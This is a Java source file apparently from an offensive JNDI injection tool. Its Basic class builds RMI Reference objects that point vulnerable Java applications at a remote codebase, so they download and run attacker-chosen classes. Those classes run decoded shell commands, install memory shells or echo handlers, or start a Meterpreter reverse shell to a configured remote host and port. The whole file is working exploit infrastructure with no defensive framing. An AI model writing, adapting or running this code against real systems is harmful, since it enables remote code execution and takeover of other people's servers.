package com.qi4l.JYso.controllers.rmi;

import com.qi4l.JYso.enumtypes.GadgetType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Utils;
import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
import com.qi4l.JYso.template.Meterpreter;
import org.fusesource.jansi.Ansi;

import javax.naming.Reference;
import java.net.URL;
import java.util.Locale;

/**
 * Build remote-loading Reference for RMI lookup path:
 * basic/{payload}/{gadget}/{arg}
 */
public class Basic {
    private static String     payloadType;
    private static String[]   params = new String[0];
    private static GadgetType gadgetType;

    public static Reference basic(String base) throws Exception {
        parse(base);

        String className;
        if (payloadType.contains("E-")) {
            String simpleName = suffixAfterDash(payloadType);
            Class<?> echoClass = Class.forName(ClassNameHandler.searchClassByName(simpleName));
            className = echoClass.getName();
        } else if (payloadType.contains("M-")) {
            className = Gadgets.createClassB(suffixAfterDash(payloadType));
        } else if (payloadType.contains("command")) {
            if (params.length == 0) {
                throw new IncorrectParamsException("Missing command parameters.");
            }
            className = Gadgets.createClassB(params[0]);
        } else if (payloadType.contains("msf")) {
            className = Meterpreter.class.getName();
        } else {
            throw new UnSupportedPayloadTypeException("Unsupported payload flag: " + payloadType);
        }

        URL targetUrl = new URL(new URL(Config.codeBase), className.replace('.', '/') + ".class");
        System.out.println(Ansi.ansi().fgBrightBlue().a("  redirecting to " + targetUrl).reset());

        return new Reference("Foo", className, Config.codeBase);
    }

    private static void parse(String base) {
        System.out.println("- JNDI RMI Remote Reference Links ");
        try {
            String normalized = base.replace('\\', '/');
            payloadType = segment(normalized, 1);
            if (payloadType.isEmpty()) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + normalized);
            }
            System.out.println(Ansi.ansi().fgBrightMagenta().a("  Payload: " + payloadType).reset());

            gadgetType = parseGadgetType(normalized);
            params = resolveParams(normalized);
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) {
                throw (UnSupportedPayloadTypeException) e;
            }
            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }

    private static GadgetType parseGadgetType(String base) throws UnSupportedPayloadTypeException {
        String segment = segment(base, 2);
        if (segment.isEmpty()) {
            return null;
        }
        try {
            return GadgetType.valueOf(segment.toLowerCase(Locale.ROOT));
        } catch (IllegalArgumentException ignored) {
            throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + segment);
        }
    }

    private static String[] resolveParams(String base) throws Exception {
        if (gadgetType == null) {
            return new String[0];
        }

        switch (gadgetType) {
            case base64:
                String cmd = Utils.getCmdFromBase(base);
                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
                return new String[]{cmd};
            case shell:
                String encoded = Utils.getCmdFromBase(base);
                String decoded = Utils.base64Decode(encoded);
                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + decoded).reset());
                return decoded.split(" ");
            case msf:
                String[] results = Utils.getIPAndPortFromBase(base);
                Config.rhost = results[0];
                Config.rport = results[1];
                System.out.println("  RemoteHost: " + results[0]);
                System.out.println("  RemotePort: " + results[1]);
                return results;
            default:
                return new String[0];
        }
    }

    private static String segment(String base, int index) {
        int cursor = 0;
        int found = 0;
        while (cursor < base.length()) {
            int nextSlash = base.indexOf('/', cursor);
            if (nextSlash == -1) {
                nextSlash = base.length();
            }
            if (nextSlash > cursor) {
                if (found == index) {
                    return base.substring(cursor, nextSlash);
                }
                found++;
            }
            cursor = nextSlash + 1;
        }
        return "";
    }

    private static String suffixAfterDash(String value) {
        int dashIndex = value.indexOf('-');
        return dashIndex >= 0 ? value.substring(dashIndex + 1) : value;
    }
}
